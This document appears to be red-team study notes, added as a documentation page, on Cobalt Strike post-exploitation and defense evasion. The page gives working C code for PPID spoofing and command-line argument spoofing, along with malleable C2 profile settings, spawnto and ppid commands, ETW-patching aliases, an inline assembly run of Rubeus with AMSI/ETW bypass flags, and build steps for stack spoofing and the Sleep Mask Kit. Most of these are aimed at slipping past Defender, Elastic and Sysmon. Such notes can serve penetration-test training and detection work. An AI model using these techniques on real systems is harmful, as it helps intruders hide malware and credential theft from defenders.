@@ -1,0 +1,592 @@
+import { Tab, Tabs, Callout } from 'nextra-theme-docs'
+
+### Cobalt Strike Post Explotation
+CS's post exploitation commands are of 4 types:
+- **House-Keeping** commands: These commands set a configuration option in Beacon, such as sleep and jobs or do something in the UI, such as clear, help & note.  They don't task Beacon to perform an executable action.
+- **API Only** commands: These commands are built directly into the Beacon payload using the Windows APIs.  Examples include cd, cp, ls, make_token, and ps.
+- **Inline Execution** commands: These commands are implemented as [Beacon Object Files](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm) (BOFs) which are pushed to Beacon over the C2 channel and executed within the Beacon process.  `jump` `psexec/64/psh` and `remote-exec psexec/wmi` are amongst this group.
+- **Fork and Run** commands: These commands spawn a temporary process and a post-exploitation DLL is injected into it. The capability runs and any output is captured over a named pipe.  **execute-assembly**, **powerpick** and **mimikatz** use this pattern.
+
+### Memory Permissions & Clean
+- If we analyzed the process memory of our injected target process, we'll notice that there are 2 memory locations with **RWX**, but we only injected 1 which holds the Beacon shellcode !!.
+![rwx](/images/rwx.png)
+- The reason we end up with two memory allocations is because Beacon is actually implemented as a DLL and a technique called **reflective DLL injection** is used to load it into memory.  Whenever we generate Beacon shellcode, what we are actually getting is the Beacon DLL, plus a reflective loader component.
+- The job of the reflective loader is to map the Beacon DLL into memory in a similar way that the standard Windows loader would if an API such as LoadLibrary was called.  This involves allocating new memory, mapping the PE headers, sections, import table, and relocations.  Once the DLL is mapped, it's entry point is called which kicks off the actual Beacon payload.
+- So in this case - 1 RWX region is allocated by the injector and the other RWX region by the reflective loader.
+- Many defensive products will alert on RWX memory regions within a native process as potentially malicious.
+- We can change this **RWX** permission by changing this configuration in the malleable C2 Porfile
+```  copy
+stage {
+    set userwx "false";
+    set cleanup "true";
+}
+```
+**What this will do is**:
+- Setting `userwx` to `false` will tell the reflective loader to allocate memory for Beacon as `RW` first and then flips it to `RX`.
+- Setting `cleanup` to `true` instructions Beacon to attempt to unload the reflective loader from memory.
+After doing that and restarting the teamserver, notice that the beacon will be runnin in `RX` instead of `RWX`
+![rx](/images/rx.png)
+
+### Beacon object files (BOFs) Memory Allocation
+- recently introduced a new code execution concept named [**BOF**](https://www.cobaltstrike.com/help-beacon-object-files?_gl=1*19vmige*_ga*MTE4MTg3NTU3OC4xNjkxOTc4NzQ2*_ga_NHMHGJWX49*MTY5MjAzOTgzNi4yLjAuMTY5MjAzOTgzNi42MC4wLjA.) are small compiled c code in the form of object files `.o` or rather executables that we need to run in the context of the beacon process.
+- [**Outflank's blog of direct calls in beacon object files**](https://outflank.nl/blog/2020/12/26/direct-syscalls-in-beacon-object-files/) explains it very well: 
+
+  What’s the benefit of this? Most importantly, we get rid of a concept named fork & run. Before Beacon Object Files, this concept was the default mechanism for running jobs in Cobalt Strike. This means that for execution of most post-exploitation functionality a sacrificial process was started (specified using the ***`spawnto`*** parameter) and subsequently the offensive capability was injected to that process as a reflective DLL. From an AV/EDR perspective, this has various traits that can be detected, such as process spawning, process injection and reflective DLL memory artifacts in a process. In many modern environments fork & run can easily turn into an OPSEC disaster. With Beacon Object Files we run compiled position independent code within the context of Beacon’s current process, which is much more stealthy.
+- We can create one as follows:
+ THE `beacon.h` can be downloaded from [CobaltStrike BOF repo](https://raw.githubusercontent.com/Cobalt-Strike/bof_template/main/beacon.h)
+<Tabs items={['beacon.h', 'bof.c']}>
+  <Tab>
+   ```c copy
+   /*
+ * Beacon Object Files (BOF)
+ * -------------------------
+ * A Beacon Object File is a light-weight post exploitation tool that runs
+ * with Beacon's inline-execute command.
+ *
+ * Additional BOF resources are available here:
+ *   - https://github.com/Cobalt-Strike/bof_template
+ *
+ * Cobalt Strike 4.x
+ * ChangeLog:
+ *    1/25/2022: updated for 4.5
+ */
+
+/* data API */
+typedef struct {
+	char * original; /* the original buffer [so we can free it] */
+	char * buffer;   /* current pointer into our buffer */
+	int    length;   /* remaining length of data */
+	int    size;     /* total size of this buffer */
+} datap;
+
+DECLSPEC_IMPORT void    BeaconDataParse(datap * parser, char * buffer, int size);
+DECLSPEC_IMPORT char *  BeaconDataPtr(datap * parser, int size);
+DECLSPEC_IMPORT int     BeaconDataInt(datap * parser);
+DECLSPEC_IMPORT short   BeaconDataShort(datap * parser);
+DECLSPEC_IMPORT int     BeaconDataLength(datap * parser);
+DECLSPEC_IMPORT char *  BeaconDataExtract(datap * parser, int * size);
+
+/* format API */
+typedef struct {
+	char * original; /* the original buffer [so we can free it] */
+	char * buffer;   /* current pointer into our buffer */
+	int    length;   /* remaining length of data */
+	int    size;     /* total size of this buffer */
+} formatp;
+
+DECLSPEC_IMPORT void    BeaconFormatAlloc(formatp * format, int maxsz);
+DECLSPEC_IMPORT void    BeaconFormatReset(formatp * format);
+DECLSPEC_IMPORT void    BeaconFormatAppend(formatp * format, char * text, int len);
+DECLSPEC_IMPORT void    BeaconFormatPrintf(formatp * format, char * fmt, ...);
+DECLSPEC_IMPORT char *  BeaconFormatToString(formatp * format, int * size);
+DECLSPEC_IMPORT void    BeaconFormatFree(formatp * format);
+DECLSPEC_IMPORT void    BeaconFormatInt(formatp * format, int value);
+
+/* Output Functions */
+#define CALLBACK_OUTPUT      0x0
+#define CALLBACK_OUTPUT_OEM  0x1e
+#define CALLBACK_OUTPUT_UTF8 0x20
+#define CALLBACK_ERROR       0x0d
+
+DECLSPEC_IMPORT void   BeaconOutput(int type, char * data, int len);
+DECLSPEC_IMPORT void   BeaconPrintf(int type, char * fmt, ...);
+
+
+/* Token Functions */
+DECLSPEC_IMPORT BOOL   BeaconUseToken(HANDLE token);
+DECLSPEC_IMPORT void   BeaconRevertToken();
+DECLSPEC_IMPORT BOOL   BeaconIsAdmin();
+
+/* Spawn+Inject Functions */
+DECLSPEC_IMPORT void   BeaconGetSpawnTo(BOOL x86, char * buffer, int length);
+DECLSPEC_IMPORT void   BeaconInjectProcess(HANDLE hProc, int pid, char * payload, int p_len, int p_offset, char * arg, int a_len);
+DECLSPEC_IMPORT void   BeaconInjectTemporaryProcess(PROCESS_INFORMATION * pInfo, char * payload, int p_len, int p_offset, char * arg, int a_len);
+DECLSPEC_IMPORT BOOL   BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO * si, PROCESS_INFORMATION * pInfo);
+DECLSPEC_IMPORT void   BeaconCleanupProcess(PROCESS_INFORMATION * pInfo);
+
+/* Utility Functions */
+DECLSPEC_IMPORT BOOL   toWideChar(char * src, wchar_t * dst, int max);
+```
+  </Tab>
+  <Tab>
+  ```c copy
+  #include <windows.h>
+  #include <beacon.h>
+
+  DECLSPEC_IMPORT VOID WINAPI KERNEL32$Sleep(DWORD);
+
+  void go(char* args, int len){
+    // Sleep command to hault the execution untill we inspect the memory of the process
+
+    KERNEL32$Sleep(30000)
+  }
+  ``` 
+  </Tab>
+</Tabs>
+
+This BOF can be compiled on either windows or linux
+<Tabs items={['Windows', 'Linux']}>
+  <Tab>
+    ```powershell copy
+    cl.exe /c /GS- bof.c /Fobof.o
+    ```
+  </Tab>
+  <Tab>
+   ```bash copy
+   x86_64-w64-mingw32-gcc -c bof.c -o bof.o
+   ```
+  </Tab>
+</Tabs>
+
+the BOF then can be injected in the beacon channel using 
+```bash
+beacon> inline-execute C:\Users\Attacker\Desktop\test-bof\bof.o
+```
+After we inject the **bof** we'll notice a **RWX** region containing the payload, but after it gets executed, the beacon will zero it out, because beacons tend to re-use the same region for multiple **BOFs** rather than re-allocating and freeing memory each time.
+After loading the **BOF** directly
+![bof1](/images/bof-1.png)
+
+After 30 seconds (the time we sleep in the BOF code)
+![bof2](/images/bof-2.png)
+
+Now, we know that the creation of **RWX** regions in the process memory gets detected as a potential malicious activity, but fortunately, CS allows us to change this behaviour by enabling us with a slight modification in the malleable C2 profile.
+```JSON copy
+process-inject {
+    set startrwx "false";
+    set userwx "false";
+    set bof_reuse_memory "false";
+}
+``` 
+- Setting `startrwx` to `false` tells Beacon to allocate BOF memory as `RW`, rather than `RWX`.
+- Setting `userwx` to `false` tells Beacon to set the memory to RX before execution.
+- Setting `bof_reuse_memory` to false tells Beacon to free BOF memory after execution.
+
+After adding this directive to any of the c2 profiles and use it, we'll notice that instead of  a `RWX` secion, we'll have a `RX` with our BOF payload
+![bof-3](/images/bof-3.png)
+and after a few seconds, we won't be able to access it, don't know why 🙋‍♂️
+![bof-4](/images/bof-4.png)
+<Callout type="info" emoji="👻">
+        Because these directives are inside the `process-inject` block, they so also have an impact other other `injection` commands such as `inject`, `shinject` and `shspawn`
+</Callout>
+
+### SpawnTo
+- The `spawnto` command controls which binary is used as a temporary process for fork and run commands.
+- The default behaviour of CS beacons is to spawn the binaries under the beacons's process, and as expected, this is universally detected as a malicious activity and the beacon will be killed by the **Defender**
+- To use `spawnto`
+  ```bash copy
+  beacon> spawnto x64 %windir%\sysnative\notepad.exe
+  ```
+- When we use `spawnto` with as an example `notepad.exe`, we'll bypass the detection of Defender and notice that the beacon didn't get killed.
+![spawnto](/images/spawnto-1.png)
+- If we want to set an executable as a default `spawnto` we can add the following directive to our profile
+```json copy  
+post-ex {
+    set spawnto_x86 "%windir%\\syswow64\\notepad.exe";
+    set spawnto_x64 "%windir%\\sysnative\\notepad.exe";
+}
+```
+
+### Process Inject Kit
+Fork & run commands have two variants:
+- **process injection spawn**: these commands spawns a new process and inject the post-ex capability into it, just like the previous example 
+- **process injection explicit**: these commands inject the post-ex capabilities into an already running process
+- Beacon has two internal APIs that are responsible for these behaviours, called `BeaconInjectTemporaryProcess` and `BeaconInjectProcess`.  They are define in `beacon.h`
+- In versions of Cobalt Strike prior to 4.5, the actual APIs used to control the "style" of process injection could only be controlled in the malleable C2 profile.
+- The **Process Inject Kit** was introduced as method of allowing operators to write their own custom implementations as a BOF.
+- The arsenal kit can be downloaded using a license from here [CS Arsenal Kit](https://download.cobaltstrike.com/scripts)
+- The src directory contains `process_inject_spawn.c` and `process_inject_explicit.c`, which controls each fork & run variant. 
+- Modifying the kit is as simple as replacing this default code with your own injection methods, although it's still a good idea to use the internal Beacon APIs as a fallback in case your custom methods fail.
+- Compiling form linux `/process_inject> ./build.sh /mnt/c/Tools/cobaltstrike/custom-injection`
+
+### PPID Spoofing
+- When spawning a process it will do so as a child of the caller
+- The **PPID spoofing** technique allows the caller to change the parent process for the spawned child
+- This helps to push back against detections that rely on these parent/child relationships
+- This can be achieved using the `STARTUPINFOEX` struct, which has an `LPPROC_THREAD_ATTRIBUTE_LIST` member.  This allows us to pass additional attributes to the `CreateProcess` call. For the purpose of PPID spoofing, the attribute of interest is `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`.
+
+```c filename="PPID-Spoofer.c" copy showLineNumbers {34}
+#include <Windows.h>
+#include <iostream>
+
+int main()
+{
+    const DWORD attributeCount = 1;
+
+    LPSTARTUPINFOEXW si = new STARTUPINFOEXW();
+    si->StartupInfo.cb = sizeof(STARTUPINFOEXW);
+
+    SIZE_T lpSize = 0;
+
+    // call once to get lpSize
+    InitializeProcThreadAttributeList(
+        NULL,
+        attributeCount,
+        0,
+        &lpSize);
+
+    // allocate the memory
+    si->lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(lpSize);
+
+    // call again to initialise the list
+    InitializeProcThreadAttributeList(
+        si->lpAttributeList,
+        attributeCount,
+        0,
+        &lpSize);
+
+    // open a handle to the desired parent
+    HANDLE hParent = OpenProcess(
+        PROCESS_CREATE_PROCESS,
+        FALSE,
+        5584); // hardcoded pid of explorer
+
+    // update the list
+    UpdateProcThreadAttribute(
+        si->lpAttributeList,
+        NULL,
+        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
+        &hParent,
+        sizeof(HANDLE),
+        NULL,
+        NULL);
+
+    // create process
+    PPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+    wchar_t cmd[] = L"notepad.exe\0";
+
+    CreateProcess(
+        NULL,
+        cmd,
+        NULL,
+        NULL,
+        FALSE,
+        EXTENDED_STARTUPINFO_PRESENT,
+        NULL,
+        NULL,
+        &si->StartupInfo, 
+        pi);
+
+    // print the pid
+    printf("PID: %d\n", pi->dwProcessId);
+
+    // cleanup list and memory
+    DeleteProcThreadAttributeList(si->lpAttributeList);
+    free(si->lpAttributeList);
+
+    // close handle to parent
+    CloseHandle(hParent);
+}
+```
+![PPID-Spoof](/images/ppid-spoof-1.png)
+
+the **PPID Spoofing** is most effective when combined with `spawnto`.
+We can inject our post-ex capability into a running process using `ppid` command 
+Injecting Mimikatz into chrome.exe process
+![PPID-Spoof](/images/ppid-spoofing-1.png)
+Now our mimikatz process is running as a child of chrome
+![PPID-SPoof](/images/ppid-spoofing-2.png)
+And ofcourse  Defender is running
+![PPID-SPoof](/images/ppid-spoofing-3.png)
+
+### Command Line Argument Spoofing
+Within each process properties theres is an attribute that has the starting command line that was used to spawn the process. as an example, this is a comparison between 2 processes, one is spawned by us, an the other is started using the UI normally.
+![Command-Line-Argument-Spoofing](/images/command-line-argument-spoofing-1.png)
+If we printed `Hello World` from the powershell as example `powershell -c "Write-Host 'Hello World'"` it will have this command as its command line argument
+![Command-Line-Argument-Spoofing](/images/command-line-argument-spoofing-2.png)
+What's important to us is that this action in the windows event log (Sysmon)
+![Command-Line-Argument-Spoofing](/images/command-line-argument-spoofing-3.png)
+Soo, this event can be analyzed by security solutions to check if this action was taken normally from the UI, Or Its suspecious ..
+To bypass this behaviour, We can use **Command Line Argument Spoofing** which simply is achieved  by spawning a process in a suspended state with a set of "fake" arguments that will be logged as part of the process creation event.  We then reach into the processes' memory and replace the fake arguments with the actual arguments we want to have run, and then resume the process.
+- Code can be found here [How to argue like cobalt](https://blog.xpnsec.com/how-to-argue-like-cobalt-strike/)
+```c showLineNumbers copy {101, 61}
+#include <iostream>
+#include <Windows.h>
+#include <winternl.h>
+
+typedef NTSTATUS(*NtQueryInformationProcess2)(
+	IN HANDLE,
+	IN PROCESSINFOCLASS,
+	OUT PVOID,
+	IN ULONG,
+	OUT PULONG
+	);
+
+void* readProcessMemory(HANDLE process, void* address, DWORD bytes) {
+	SIZE_T bytesRead;
+	char* alloc;
+
+	alloc = (char*)malloc(bytes);
+	if (alloc == NULL) {
+		return NULL;
+	}
+
+	if (ReadProcessMemory(process, address, alloc, bytes, &bytesRead) == 0) {
+		free(alloc);
+		return NULL;
+	}
+
+	return alloc;
+}
+
+BOOL writeProcessMemory(HANDLE process, void* address, void* data, DWORD bytes) {
+	SIZE_T bytesWritten;
+
+	if (WriteProcessMemory(process, address, data, bytes, &bytesWritten) == 0) {
+		return false;
+	}
+
+	return true;
+}
+
+int main(int argc, char** canttrustthis)
+{
+	STARTUPINFOA si;
+	PROCESS_INFORMATION pi;
+	CONTEXT context;
+	BOOL success;
+	PROCESS_BASIC_INFORMATION pbi;
+	DWORD retLen;
+	SIZE_T bytesRead;
+	PEB pebLocal;
+	RTL_USER_PROCESS_PARAMETERS* parameters;
+
+	printf("Argument Spoofing Example by @_xpn_\n\n");
+
+	memset(&si, 0, sizeof(si));
+	memset(&pi, 0, sizeof(pi));
+
+	// Start process suspended
+	success = CreateProcessA(
+		NULL,
+		(LPSTR)"powershell.exe -NoExit -c Write-Host 'This is just a friendly argument, nothing to see here'",
+		NULL,
+		NULL,
+		FALSE,
+		CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
+		NULL,
+		"C:\\Windows\\System32\\",
+		&si,
+		&pi);
+
+	if (success == FALSE) {
+		printf("[!] Error: Could not call CreateProcess\n");
+		return 1;
+	}
+
+	// Retrieve information on PEB location in process
+	NtQueryInformationProcess2 ntpi = (NtQueryInformationProcess2)GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryInformationProcess");
+	ntpi(
+		pi.hProcess,
+		ProcessBasicInformation,
+		&pbi,
+		sizeof(pbi),
+		&retLen
+	);
+
+	// Read the PEB from the target process
+	success = ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &pebLocal, sizeof(PEB), &bytesRead);
+	if (success == FALSE) {
+		printf("[!] Error: Could not call ReadProcessMemory to grab PEB\n");
+		return 1;
+	}
+
+	// Grab the ProcessParameters from PEB
+	parameters = (RTL_USER_PROCESS_PARAMETERS*)readProcessMemory(
+		pi.hProcess,
+		pebLocal.ProcessParameters,
+		sizeof(RTL_USER_PROCESS_PARAMETERS) + 300
+	);
+
+	// Set the actual arguments we are looking to use
+	WCHAR spoofed[] = L"powershell.exe -NoExit -c Write-Host Surprise, arguments spoofed\0";
+	success = writeProcessMemory(pi.hProcess, parameters->CommandLine.Buffer, (void*)spoofed, sizeof(spoofed));
+	if (success == FALSE) {
+		printf("[!] Error: Could not call WriteProcessMemory to update commandline args\n");
+		return 1;
+	}
+
+	/////// Below we can see an example of truncated output in ProcessHacker and ProcessExplorer /////////
+
+	// Update the CommandLine length (Remember, UNICODE length here)
+	DWORD newUnicodeLen = 28;
+
+	success = writeProcessMemory(
+		pi.hProcess,
+		(char*)pebLocal.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length),
+		(void*)&newUnicodeLen,
+		4
+	);
+	if (success == FALSE) {
+		printf("[!] Error: Could not call WriteProcessMemory to update commandline arg length\n");
+		return 1;
+	}
+
+	// Resume thread execution*/
+	ResumeThread(pi.hThread);
+}
+```
+When we run this code, we'll find that the code that what the arguments  that will run actually is our malicious one 
+![Command-Line-Argument-Spoofing](/images/command-line-argument-spoofing-6.png)
+but in the commandline argument in the event logger, It will show our fake CommandLine
+![Command-Line-Argument-Spoofing](/images/command-line-argument-spoofing-5.png)
+and there is no trace for our malicious argument that actually ran
+![Command-Line-Argument-Spoofing](/images/command-line-argument-spoofing-4.png)
+
+- This behaviour can be done within the beacon process using  `argue` command
+- We can scan / ping the localhost and make the event logger log that we're pinging to google.
+![Command-Line-Argument-Spoofing](/images/command-line-argument-spoofing-7.png)
+- the command line that was logged
+![Command-Line-Argument-Spoofing](/images/command-line-argument-spoofing-8.png)
+
+### Network Connections
+- Its critical to choose the process to inject into based on the  behaviour that the beacon and the  post-exp capabilities would do, If we'll perform web requests, Its more convenient to choose a browser process to inject into.
+- If we want to execute tools that would produce **LDAP** traffic like `Rubeus.exe` or `LDAPSearch` its more convenient to `spawnto` a proces that is likely to produce  the same type of traffic like:
+  - `gpresult.exe`
+      ```shell copy
+      beacon> spawnto x64 %windir%\sysnative\gpresult.exe
+      beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --computers
+      ```
+  - `ServerManager.exe`
+  - `dsac.exe`
+
+  - The only native process on a Windows domain-joined machine that normally produces Kerberos traffic is lsass.exe which, although possible,but Its highly detectable.
+  - There is another type of alert (that may or may not be specific to Elastic), called "Network Connection via Process with Unusual Arguments".
+  his rule works by looking at network connections from processes that typically have more than one command line argument, but started with just one.  For example, if you have your spawnto set to dllhost.exe, then the process creation events for fork & run post-ex commands would look something like:
+  ```C
+  Image: C:\Windows\System32\dllhost.exe
+  CommandLine: C:\Windows\system32\dllhost.exe
+  ```
+  but it typcally should have some arguments like
+  ![Command-Line-Argument-Spoofing](/images/network-connections-1.png)
+  - The rule is essentially concluding that the binary is performing some function even though it was not started in the typical way, which it considers suspicious.
+  - Unfortunately, the `argue` command does not apply to `post-ex` jobs, so we cannot use that here.
+  - Although we can use the `spawnto` command with arguments instead of `argue` in some situations
+  ```powershell copy
+  beacon> spawnto x64 %windir%\sysnative\dllhost.exe /Processid:{11111111-2222-3333-4444-555555555555}
+  ```
+  - Another fun fact is that this pattern also allows it to bypass process creation events in [SwiftOnSecurity's Sysmon configuration](https://github.com/SwiftOnSecurity/sysmon-config/tree/master)
+
+  ### Image Load events
+  - An "image load" event occurs when a process loads a DLL into memory, This is a perfectly legitimate occurrence and all processes will have a plethora DLLs loaded.
+  - Ingesting all image load events into a SIEM is not completely viable due to the huge volume, but defenders can selectively forward specific image loads based on known attacker TTPs. One example of this is `System.Management.Automation.dll`, which contains the runtime for hosting PowerShell. Both powershell.exe and other "unmanaged" PowerShell tools require this DLL to function.  Therefore, any anomalous process loading this DLL could be seen as suspicious
+  - Attempting to run `PowerView` with `powerpick` may produce this alert
+  ```powershell copy
+  beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
+  beacon> powerpick Get-Domain
+  ```
+  - This is because our current spawnto binary is not one that is known to legitimately load this DLL. To circumvent the alert, we can simply modify the spawnto to one that is known to load it, such as `msiexec.exe`
+  ```powershell copy
+  beacon> spawnto x64 %windir%\sysnative\msiexec.exe
+  beacon> powerpick Get-Domain
+  ``` 
+
+
+### Tool Signatures
+  - You will come across instances where in-memory scanners are able to pick out known tools based on static signatures, even if other parts of your execution chain (`ppid`, `spawnto`, etc) are "correct".
+  - For example, executing `SharpUp` will trigger the `Windows.Hacktool.SharpUp` alert.
+  - We can have a look on the yara rules of the [tools](https://github.com/GhostPack) to have an idea about how the tool gets detected statically. and then by changing the code of the tool and recompiling it, we can bypass the analysis.
+  - Elastic [open sourced](https://github.com/elastic/protections-artifacts/tree/main/yara/rules) a lot of their yara rules on the tools 
+
+
+### SMB named pipes
+- Beacon uses SMB named pipes in four main ways.
+  1. Retrieve output from fork and run commands such as `execute-assembly` and `powerpick`.
+  2. Connect to Beacon's SSH agent.
+  3. The SMB Beacon's named pipe stager.
+  4. C2 comms in the SMB Beacon itself.
+
+- Sysmon event ID 17 (pipe created) and 18 (pipe connected) can be used to spot the default pipe name used by Beacon in these situations.
+- The default pipe name for `post-ex` commands is `postex_####`; the default for the SSH agent is `postex_ssh_####`; the default for the SMB Beacon's stager is `status_##`; and the default for the main SMB Beacon C2 is `msagent_##`.  In each case, the #'s are replaced with random hex values.
+- changing the pipe names to something relatively random will get you by most times.  Some operators choose to use names that are used by legitimate applications - a good example is the `mojo` pipe name that Google Chrome uses. **If you go down this route, make sure your ppid and spawnto match this pretext**.
+- The `pipename_stager` and `ssh_pipename` Malleable C2 directives are global options (not part of a specific block).
+- To change the pipe name used in `post-ex` commands, use the `set pipename` directive in the `post-ex` block. This can take a comma-separated list of names, and can include the # character for some randomisation.
+```json copy
+post-ex {
+        set pipename "totally_not_beacon, legitPipe_##";
+}
+```
+
+### Event Tracing for Windows **ETW**
+To read:
+- https://medium.com/threat-hunters-forge/threat-hunting-with-etw-events-and-helk-part-1-installing-silketw-6eb74815e4a0
+- https://blog.xpnsec.com/hiding-your-dotnet-etw/
+- https://blog.iisreset.me/tracing-as-a-service-with-silketw-pt/
+
+- Event Tracing for Windows (ETW) by [mandiant](https://www.mandiant.com/resources/blog/silketw-because-free-telemetry-is-free) is an efficient kernel-level tracing facility that lets you log kernel or application-defined events to a log file.  
+- [SILKETW](https://github.com/mandiant/SilkETW) from mandiant is a c# wrapper for **ETW** and It can output data to (URL, Windows Event Log, JSON) and have integration with **YARA**
+- A popular use case for it is to provide .NET introspection - that is, to detect .NET assemblies in memory
+- One method to bypass ETW is to patch the EtwEventWrite exported function inside `ntdll.dll`, This research was published by Adam Chester here and works just like various AMSI bypasses (by patching functions in memory).
+- This can be integrated into Beacon's `execute-assembly` command?  Since **CS 4.8** a new "patch" ability was added for this purpose, which instructs Beacon to perform the given memory patches in the temporary process prior to the post-ex capability being executed. The two commands this is supported on is `execute-assembly` and `powerpick`.
+- to batch the ETW while running Rubeus.exe
+  ```powershell copy
+  beacon> execute-assembly "PATCHES: ntdll.dll,EtwEventWrite,0,C3 ntdll.dll,EtwEventWrite,1,00" C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe
+  ```
+- We could create custom commands in Aggressor instead of patching everytime. 
+  ```json copy
+  alias powerpick-patched {
+    bpowerpick($1, $2, $3, "PATCHES: ntdll.dll,EtwEventWrite,0,C3 ntdll.dll,EtwEventWrite,1,00");
+  }
+  ```
+  ```json copy
+  alias myutil {
+    bexecute_assembly($1, $2, $3, "PATCHES: ntdll.dll,EtwEventWrite,0,C3 ntdll.dll,EtwEventWrite,1,00");
+  }
+  ```
+- Then run `execute-assembly-patched`
+  ```powershell copy
+  beacon> execute-assembly-patched C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe
+  ```
+### Inline .NET execution
+- The `execute-assembly` command allows operators to load and execute .NET assemblies in-memory, without dropping them to disk
+- Since this is fork and run, it will spawn a temporary process, load and execute the assembly inside it, then read the output over a named pipe.
+- Fork and run commands are good because they protect the Beacon from unwanted crashes due to unstable post-ex tools.
+- but they come at a hefty price.  Two major downsides include **the process spawn event** and **the subsequent remote injection**.
+- Spawning a process has all sorts of associated issues, such as the parent-child relationship.  Techniques like PPID spoofing can help but that also has its own detection footprint.  Once a process has been spawned successfully, the post-ex capability then has to be injected into it.  In most cases with Cobalt Strike
+As an alternative, the Cobalt Strike development team introduced BOFs as a new means of executing post-ex code inside the Beacon process itself.  They even re-worked a lot of their own internal command implementations from fork and run to BOFs.  However, some commands, including `execute-assembly` have remained as fork and run.
+@anthemtotheego wrote and published a BOF called [InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly) that allows .NET assemblies to be loaded and executed from inside Beacon, without needing fork and run.
+- We can load the `CNA` file and the tool will become available
+- This will load the CLR into the current process, which may be detected as a suspicious image load event depending on the process your Beacon is running in.
+  ```powershell copy 
+  # change the appDomain and pipe parameters for more stealth
+  beacon> inlineExecute-Assembly --dotnetassembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe --assemblyargs klist --amsi --etw --appdomain SharedDomain --pipe dotnet-diagnostic-1337
+  ```
+### Thread Stack Spoofing
+also called **Call Stack Spoofing**
+- By analyzing the stack of the thread that is running the beacon shell code, we'll notice that there is a `sleepEx` method with a return address that poitns directly to our beacon `.text` section which has the actual beacon shellcode
+![stack-spoof-2](/images/stack-spoof-2.png)
+
+  ![stack-spoof-3](/images/stack-spoof-3.png)
+
+  and that's how our beacon gets caught in memory with the memory scan abilities of **Elastic**
+
+- **Thread Stack (or Call Stack) Spoofing**, is another in-memory evasion technique which aims to hide abnormal or suspicious call stacks. 
+- There is also an exceptionally cool tool called [Hunt-Sleeping-Beacons.exe](https://github.com/thefLink/Hunt-Sleeping-Beacons) that you can run from a command prompt.  It will search for sleeping threads and then walks the call stack to find abnormalities.
+- Cobalt Strike's default implementation of stack spoofing can be found in the Artifact Kit under `src-common/spoof.c`.
+- It essentially leverages [Fibers](https://learn.microsoft.com/en-us/windows/win32/procthread/fibers) to switch the context of the thread stack during Beacon's sleep phase to obscure the actual return address.
+- It can be enabled by setting the `stack spoof` option in the build script to `true` which is a positional command line argument for the `build.sh`.
+  ![stack-spoof-4](/images/stack-spoof-4.png)
+  ```bash copy filename="Bash"
+  build.sh "pipe" MapViewOfFile 296948 0 true true none /mnt/c/Tools/cobaltstrike/artifacts 
+  ```
+- **Hunt-Sleeping-Beacons.exe** won't identify our beacon thread after this.
+
+  **Before**: 
+  ![stack-spoof-5](/images/stack-spoof-5.png)
+  
+  **After**: 
+  ![stack-spoof-6](/images/stack-spoof-6.png)
+
+### Sleep Mask Kit
+- The `Elastic` Agent has memory scanning capabilities where it will look for known (static) indicators of Beacon.  The **Sleep Mask Kit** was introduced in CS 4.4 and sought to push back on these types of in-memory detections.
+- the Beacon reflective DLL will be running in an RX (or even RWX) region of process memory.  It will check into the team server for new jobs after every sleep cycle, execute them (if any) and then goes back to sleep.
+- The **Sleep Mask Kit** provides a means for Beacon to obfuscate its own memory regions before entering the sleep cycle, and then deobfuscate itself when it wakes up.  The default mask achieves this by walking its own memory and XOR'ing each byte with a random key.
+-  It's important to understand that the Sleep Mask becomes less effective the shorter Beacon's sleep time is, because it will spend more time in a deobfuscated state.
+- building the **Sleep Mask Kit**
+  ```bash copy
+  ./build.sh 47 WaitForSingleObject true none /mnt/c/Tools/cobaltstrike/sleep-mask
+  ```
+- Add set sleep_mask "true"; to the stage block of your C2 profile, load sleepmask.cna via the CS Script Manager and then regenerate your payloads.
+- This use of the **Sleep Mask Kit** is not compatible with the stack spoofing shown in the previous section.  The reason for this is that the stack spoofing code places a hook on Beacon's sleep function with a small trampoline that redirects execution flow in order to perform the spoofing.  This sleep mask code essentially overwrites this because it also needs to hook the sleep function to perform the memory masking.
+- To work around this, the **Sleep Mask Kit** has an additional option called "evasive sleep", of which there are two flavours - "evasive sleep" and "evasive sleep stack spoof".  Both are only supported on 64-bit.  The stack spoofing available here is also far more flexible than the version included inside the Artifact Kit, as it allows you to arbitrarily form your own stack from scratch.  However, that flexibility comes with some overhead.
+- First off, we have to enable evasive sleep inside the **Sleep Mask Kit** source code.  Open sleepmask.c and go to **line 24** (at the time of writing) - you're looking for the #define EVASIVE_SLEEP line.  Simply change this from 0 to 1.
+- Next, scroll down to the #if EVASIVE_SLEEP **line (64 at the time of writing)**.  Comment out the line for including evasive_sleep.c and uncomment the line for including evasive_sleep_stack_spoof.c.
